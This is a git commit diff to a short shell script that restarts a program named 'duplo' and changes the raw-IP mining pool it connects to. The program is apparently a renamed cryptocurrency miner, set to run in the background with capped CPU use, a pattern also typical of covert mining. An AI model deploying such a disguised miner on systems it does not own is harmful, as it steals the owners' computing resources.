df277d28c494176e7c842a627a1e42fd1a229310
rekek <47266646+rekek@users.noreply.github.com>
2019-02-08 07:18:37 -0800

    Update 40.sh

--- 40.sh
+++ 40.sh
@@ -1,3 +1,3 @@
 pkill duplo
-duplo -o 116.203.53.211:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=54 --av=1 --variant -1
+duplo -o 95.216.157.222:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=54 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
